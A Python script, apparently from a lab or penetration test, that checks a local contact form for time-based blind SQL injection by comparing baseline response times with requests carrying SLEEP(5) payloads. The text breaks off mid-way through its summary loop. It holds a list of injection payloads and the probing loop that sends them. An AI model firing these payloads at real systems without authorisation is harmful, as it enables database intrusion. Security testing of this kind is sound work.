import requests
import time
import statistics

# Configuration
TARGET_URL = "http://127.0.0.1:33124/send.php"
BASELINE_REQUESTS = 3
SLEEP_DELAY = 5
TIME_THRESHOLD = 4  # Seconds above baseline to consider injection successful

# Realistic form data (benign values)
benign_data = {
    "fullname": "John Doe",
    "email": "john.doe@example.com",
    "phone": "555-123-4567",
    "subject": "Test Inquiry",
    "message": "This is a test message for contact form."
}

# Time-based SQL injection payloads
payloads = [
    "test' AND SLEEP(5)-- -",
    'test" AND SLEEP(5)-- -',
    "test' OR SLEEP(5)-- -",
    "test'+OR+SLEEP(5)--+-",  # URL encoded variant
    "test'+AND+SLEEP(5)--+-"  # URL encoded AND variant
]

def send_request(data):
    """Send POST request and return response time in seconds"""
    start_time = time.time()
    try:
        response = requests.post(TARGET_URL, data=data, allow_redirects=True, timeout=30)
        end_time = time.time()
        response_time = end_time - start_time
        return response_time, response.status_code
    except Exception as e:
        end_time = time.time()
        response_time = end_time - start_time
        return response_time, f"ERROR: {str(e)}"

def establish_baseline():
    """Establish baseline response time with normal requests"""
    print("[+] Establishing baseline response time ({} requests)".format(BASELINE_REQUESTS))
    response_times = []
    
    for i in range(BASELINE_REQUESTS):
        response_time, status = send_request(benign_data)
        response_times.append(response_time)
        print(f"  Baseline request {i+1}: {response_time:.3f}s (Status: {status})")
    
    avg_baseline = statistics.mean(response_times)
    median_baseline = statistics.median(response_times)
    stdev_baseline = statistics.stdev(response_times) if len(response_times) > 1 else 0
    
    print(f"\n[+] Baseline Statistics:")
    print(f"  Average: {avg_baseline:.3f}s")
    print(f"  Median: {median_baseline:.3f}s")
    print(f"  Std Dev: {stdev_baseline:.3f}s")
    print(f"  Threshold (baseline + {TIME_THRESHOLD}s): {avg_baseline + TIME_THRESHOLD:.3f}s")
    
    return avg_baseline, stdev_baseline

def test_payload_in_parameter(payload, param_name):
    """Test a specific payload in a specific parameter"""
    print(f"\n{'='*60}")
    print(f"[+] Testing payload in parameter: '{param_name}'")
    print(f"[+] Payload: {payload}")
    print(f"{'='*60}")
    
    # Create test data with payload in specific parameter
    test_data = benign_data.copy()
    test_data[param_name] = payload
    
    # Send request with payload
    response_time, status = send_request(test_data)
    
    print(f"Response Time: {response_time:.3f}s")
    print(f"Status Code: {status}")
    
    return response_time, status

def main():
    print("="*70)
    print("Blind SQL Injection - Time-Based Test")
    print(f"Target: {TARGET_URL}")
    print("="*70)
    
    # Step 1: Establish baseline
    baseline_time, baseline_stdev = establish_baseline()
    threshold_time = baseline_time + TIME_THRESHOLD
    
    print("\n" + "="*70)
    print("[+] STARTING PAYLOAD TESTS")
    print("="*70)
    
    results = []
    
    # Step 2: Test each payload in both 'subject' and 'message' parameters
    for payload in payloads:
        for param in ['subject', 'message']:
            print(f"\n{'#'*70}")
            payload_time, status = test_payload_in_parameter(payload, param)
            
            # Determine if injection was successful
            time_diff = payload_time - baseline_time
            is_successful = time_diff >= TIME_THRESHOLD
            
            print(f"Time Difference: {time_diff:.3f}s")
            print(f"Expected Delay: {SLEEP_DELAY}s")
            print(f"Threshold: {TIME_THRESHOLD}s")
            print(f"Result: {'POTENTIAL INJECTION DETECTED!' if is_successful else 'No significant delay'}")
            
            results.append({
                'payload': payload,
                'parameter': param,
                'response_time': payload_time,
                'time_diff': time_diff,
                'status_code': status,
                'is_successful': is_successful
            })
    
    # Step 3: Summary
    print("\n" + "="*70)
    print("[+] TEST SUMMARY")
    print("="*70)
    print(f"{'Payload':<35} {'Parameter':<10} {'Time':<8} {'Diff':<8} {'Result'}")
    print("-"*70)
    
    successful_tests = []
    for result in results:
        payload_trunc = result['payload'][:30] + "..." if len(result['payload']) > 30 else result['payload']
